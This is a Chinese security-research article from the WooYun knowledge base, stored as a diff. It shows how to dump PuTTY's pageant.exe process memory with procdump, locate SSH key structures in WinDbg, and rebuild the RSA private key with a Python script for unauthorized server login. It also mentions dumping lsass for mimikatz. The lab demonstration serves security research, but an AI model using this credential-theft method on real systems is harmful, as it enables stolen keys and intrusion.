@@ -1,0 +1,110 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Memory Dump利用实例</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/09/11 11:04" ui-time="" datetime="2015/09/11 11:04" class="published ng-binding ng-isolate-scope">2015/09/11 11:04</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>众所周知，procdump可以获得进程的内存dump文件 最常见的用法如下：</p><pre><code>1、使用procdump抓取lsass进程
+2、获得LSASS进程内存dump文件
+3、用mimikatz解析dump文件
+4、获取主机明文密码
+</code></pre><p>那么，我们是否可以大胆设想一下，能否使用procdump抓取其他进程内存文件，进而获得内存中的敏感信息呢？</p><h1>0x01 目标</h1><hr><p>尝试使用procdump获取putty ssh登录的密钥，实现非授权登录目标Linux服务器</p><h1>0x02 测试环境</h1><hr><p>目标：</p><pre><code>操作系统：Win7 x86
+进程：
+    putty.exe： SSH 客户端
+    pageant.exe：PuTTY的SSH认证代理，用这个可以不用每次登录输入口令
+</code></pre><p>使用工具：</p><pre><code>procdump
+windbg 6.3.9600 
+</code></pre><h1>0x03 环境搭建</h1><hr><h2>1、工具下载地址：</h2><pre><code>Putty工具集：
+http://the.earth.li/~sgtatham/putty/latest/x86/putty.zip
+
+windbg 6.3.9600下载地址：
+http://download.csdn.net/detail/ytfrdfiw/8182431
+</code></pre><h2>2、主机环境配置</h2><p><strong>（1）生成密匙</strong></p><p>在目标主机运行puttygen.exe，选择需要的密匙类型和长度，使用默认的SSH2(RSA)，长度设置为1024 点击Save private key 保存公私钥</p><p>如图</p><p><img alt="这里写图片描述" img-src="e00f7ffcfe24ea5f3545b4cabdbc750dc922dddb.jpg"></p><p><strong>（2）上传公钥</strong></p><p>登录Linux服务器，然后执行如下命令：</p><pre><code>$　cd　~
+$　mkdir　.ssh
+$　chmod　700　.ssh
+$　cd　.ssh
+$　cat　&gt;　authorized_keys
+粘贴公钥
+$ chmod 600 authorized_keys
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="3da10f977085336e98a51db6da9d5723acd9fae7.jpg"></p><p><strong>（3）导入私钥实现自动登录</strong></p><p>运行pageant导入私钥，运行putty.exe自动登录</p><p>如图</p><p><img alt="这里写图片描述" img-src="458db0f58020de9bd70731a9e138a86fdd75c224.jpg"></p><p><img alt="这里写图片描述" img-src="61eadbe6dc5bfd6a38a0b697216272167d87f4f9.jpg"></p><p><em>Tips：</em></p><p>出现<code>PuTTY:server refused our key</code>无法自动登录的解决方法：</p><p>禁用系统的<code>selinux</code>功能，命令<code>#setenforce 0</code></p><h1>0x04 实际测试</h1><hr><h2>1、获取进程pageant的内存文件</h2><p>执行：</p><pre><code>Procdump.exe -accepteula -ma pageant.exe lsass5putty.dmp
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="db0b56f52b4ee6350d7e392e3ac282f750c7d045.jpg"></p><h2>2、使用WinDBG定位内存文件</h2><p>使用<code>Windbg</code>加载<code>lsass5putty.dmp</code>文件，<code>alt+5</code>查看内存信息</p><p>Tips：</p><pre><code>WinDbg需要作如下设置：
+运行WinDbg-&gt;菜单-&gt;File-&gt;Symbol File Path
+在 弹出的框中输入“C:\MyCodesSymbols; SRV*C:\MyLocalSymbols*http://msdl.microsoft.com/download/symbols”(按照这样设置，WinDbg将先从本地文件夹C:\MyCodesSymbols中查找Symbol，如果找不到，则自动从MS的Symbol Server上下载Symbols，文件夹C:\MyCodesSymbols需要提前建立)
+否则会出现ERROR: Symbol file could not be found
+</code></pre><p><strong>（1）查看starting offset</strong></p><p>定位<code>00420d2c</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="652807774acda19cce1c8fcf91fb82a7a16789d1.jpg"></p><p>说明：</p><p><code>00420d2c</code>为变量<code>ssh2keys</code>固定的起始地址</p><p>后面提到的结构体参照源码中的<code>tree234.c</code>和<code>sshpubk.c</code>文件，</p><p>研究具体结构执行过程参照c源码就好</p><p>源码下载地址：</p><p>http://tartarus.org/~simon/putty-snapshots/putty-src.zip</p><p><strong>（2）查看tree234_Tag</strong></p><p>定位<code>01361f10</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="8071353594af94f97b0ae31d075c79001cf856d2.jpg"></p><pre><code>struct tree234_Tag{
+    node234 *root=013607c0;
+    cmpfn234 cmp=0040f0a5;
+};
+</code></pre><p><strong>（3）查看node234_Tag</strong></p><p>定位<code>013607c0</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="21f2716b6dd5486b6cd1c32b71e4e4e1d512e941.jpg"></p><pre><code>struct node234_Tag{
+    node234 *parent=00000000;
+    node234 *kids[4]={00000000,00000000,00000000,00000000};
+    int counts[4]={00000000,00000000,00000000,00000000};
+    void *elems[3]={01364fc8,00000000,00000000};
+};
+</code></pre><p><strong>（4）查看elems[0]</strong></p><p>定位<code>01364fc8</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="eb3e7f99c03013d84fa8f3621269a4204f4221b4.jpg"></p><pre><code>struct ssh2_userkey{
+    const struct ssh_signkey *alg=0041c83c;
+    void *data=01360b30;
+    char *comment=01360858;
+};
+</code></pre><p><strong>（5）确认是否找到ssh2_userkey，查看*comment</strong></p><p>定位<code>01360858</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="ce9218f8b61c0a20b208fae9ecbf4a111e1abfde.jpg"></p><p>发现字符<code>rsa-key-20150908</code></p><p><strong>（6）查看RSAKey，即*data</strong></p><p>定位<code>01360b30</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="1e22c4493c333cdf686baead9911083bf343ad4d.jpg"></p><pre><code>struct RSAKey{
+    int bits=01363f38;
+    int bytes=013600c4;
+    Bignum modulus=01360b70;
+    Bignum exponent=01360b60;
+    Bignum private_expinent=01363f38;
+    Bignum p=01363fc8;
+    Bignum q=01364018;
+    Bignum iqmp=01364068;
+    char *comment=00000000;
+};
+</code></pre><p><strong>（7）获取RSA key</strong></p><p>RSA key格式：</p><pre><code>Construct an RSA key object from a tuple of valid RSA components.
+See RSAImplementation.construct.
+
+Parameters:
+ tup (tuple) - A tuple of long integers, with at least 2 and no more than 6 items. The items come in the following order:
+
+ RSA modulus (n).
+ Public exponent (e).
+ Private exponent (d). Only required if the key is private.
+ First factor of n (p). Optional.
+ Second factor of n (q). Optional.
+ CRT coefficient, (1/p) mod q (u). Optional.
+Returns:
+ An RSA key object (_RSAobj).
+</code></pre><p><strong>RSA modulus:</strong></p><p>定位<code>01360b70</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="8bc56cfcffd283c1086642e6a9797d8b6639a614.jpg"></p><p>第一位<code>00000020</code>表示读取长度，转为10进制为32,读取长度为32</p><p><code>RSA modulus</code>为</p><pre><code>004b8e2f be2db5f7 575b3f42 3b9b6774 f0924e40 1418b4a9 7af433cf
+4df68526 e2866be4 6ba6a84d b49941c8 ea8462d9 b5ca8e6d 555a0f1b 3b084437
+066a5319 65a69b95 c596daa8 ab89949e 1823d812 cdff4adb 6efe09cc 003d765c
+925d10c5 2aabc14e 71f7621d fa84e9ed 8d8da1b0 9a156896 c41a0d2f b95f8c7d
+5aa2ae5a
+</code></pre><p><strong>Public exponent:</strong></p><p>定位<code>01360b60</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="714ef57693174e08b18cabe2e7739ed111e0ebc3.jpg"></p><p>第一位00000001表示读取长度，转为10进制为1，读取长度为1</p><p>Public exponent为0x25</p><p><strong>Private exponent:</strong></p><p>定位<code>01363f38</code></p><p>如图</p><p><img alt="这里写图片描述" img-src="79b07245a19b5a3ca6a1355815efd1bc72838aa6.jpg"></p><p>第一位00000020表示读取长度，转为10进制为32，读取长度为32</p><p>Private exponent为</p><pre><code>6c5c9ead 1f5b1e50 47b1b98e 231ed4b9 a2319931 24f1ebda 9650c9fd
+44735efe 7dce99ee de1bb6d9 b6e28e4b ad7f096a 0fa86baf 1f9ffb4d de181a88
+fedb8599 47efbf03 d4e866c6 04a2da80 6f5aea2a 51acf42f 02fff26d e454b02c
+8e558ad4 2aaab232 4159b68b e42d1b14 1f805e50 1fd710aa 88c26f0f 12d911a2
+02731978
+</code></pre><p><strong>（8）生成RSA key</strong></p><pre><code>import sys
+import base64
+from Crypto.PublicKey import RSA
+
+def string_to_long(data):
+    data = data.split(' ')
+    data.reverse()
+    return long(("".join(data)),16)
+
+if __name__ == "__main__":
+    #setup the primitives
+    rsamod = string_to_long('004b8e2f be2db5f7 575b3f42 3b9b6774 f0924e40 1418b4a9 7af433cf 4df68526 e2866be4  6ba6a84d b49941c8 ea8462d9 b5ca8e6d 555a0f1b 3b084437 066a5319 65a69b95 c596daa8 ab89949e 1823d812 cdff4adb 6efe09cc 003d765c 925d10c5 2aabc14e 71f7621d fa84e9ed 8d8da1b0 9a156896 c41a0d2f b95f8c7d 5aa2ae5a')
+    rsapubexp = long(0x25)
+    rsaprivexp = string_to_long('6c5c9ead 1f5b1e50 47b1b98e 231ed4b9 a2319931 24f1ebda 9650c9fd 44735efe 7dce99ee de1bb6d9 b6e28e4b ad7f096a 0fa86baf 1f9ffb4d de181a88 fedb8599 47efbf03 d4e866c6 04a2da80 6f5aea2a 51acf42f 02fff26d e454b02c 8e558ad4 2aaab232 4159b68b e42d1b14 1f805e50 1fd710aa 88c26f0f 12d911a2 02731978')
+    rawkey = (rsamod,rsapubexp,rsaprivexp)
+    #construct the desired RSA key
+    rsakey = RSA.construct(rawkey)
+    #print the object, publickey, privatekey
+    print rsakey    
+    print rsakey.publickey().exportKey('PEM')
+    print rsakey.exportKey('PEM')
+    print 'OpenSSH format Public:'
+    print rsakey.publickey().exportKey('OpenSSH')
+</code></pre><p>保存为a.py后执行得到公私钥</p><p>如图</p><p><img alt="这里写图片描述" img-src="e0502864d711f0374d946693235c362c3826d10d.jpg"></p><p>同puttygen.exe生成的公钥做对比</p><p>如图</p><p><img alt="这里写图片描述" img-src="e4472ac75ad09d4c143315f5a28c1028c05606aa.jpg"></p><p><em>Tips：</em></p><pre><code>此段python脚本使用print rsakey.publickey().exportKey('OpenSSH')输出验证公钥的正确
+私钥无法使用print rsakey.exportKey('OpenSSH')输出
+</code></pre><p>原因如下：</p><p>如图</p><p><img alt="这里写图片描述" img-src="1604ec7e5806fd250956216f0d3383840f1ace63.jpg"></p><h2>3、利用获取的私钥远程登录</h2><h1>0x05 补充</h1><hr><pre><code>https://blog.netspi.com/stealing-unencrypted-ssh-agent-keys-from-memory/
+http://www.oschina.net/translate/stealing-unencrypted-ssh-agent-keys-from-memory
+http://drops.wooyun.org/tips/2719
+</code></pre><p>如上链接，之前有人介绍过“从内存中窃取未加密的SSH-agent密钥”，但该方法是针对linxu环境的内存dump，通过python脚本直接解析 而本文实例是对windows下使用procdump抓取进程内存文件，进而获得内存中的敏感信息的一种尝试探索，全部操作过程完全可以使用一个py文件实现。 参考链接：</p><pre><code>http://www.poluoluo.com/server/201107/138424.html
+http://blog.sina.com.cn/s/blog_5f5e2ce50101788l.html
+https://www.dlitz.net/software/pycrypto/api/current/
+https://diablohorn.wordpress.com/2015/09/04/discovering-the-secrets-of-a-pageant-minidump/
+</code></pre><h1>0x06 小结</h1><hr><p>本文仅测试了putty&amp;pageant的内存密钥获取，证明了思路的正确 更多测试持续进行中</p><p>本文由三好学生原创并首发于乌云知识库，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2719" rel="bookmark" id="re1">从内存中窃取未加密的SSH-agent密钥</a></li><li><a href="http://drops.wooyun.org/tips/1951" rel="bookmark" id="re2">渗透技巧之SSH篇</a></li><li><a href="http://drops.wooyun.org/tips/12673" rel="bookmark" id="re3">Elasticsearch集群的备份与恢复</a></li><li><a href="http://drops.wooyun.org/tips/3911" rel="bookmark" id="re4">PHP WDDX Serializier Data Injection Vulnerability</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">独孤小白兔</span> <span class="reply-time">2016-06-15 15:37:29</span></div><p></p><p>mark~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zhujun_sh</span> <span class="weibo"></span> <span class="reply-time">2015-09-11 16:04:04</span></div><p></p><p>SSL的必要性</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Trojan-King</span> <span class="weibo"></span> <span class="reply-time">2015-09-11 13:59:26</span></div><p></p><p>内存窃取。。</p><p></p></div></div></div></div></div></main>
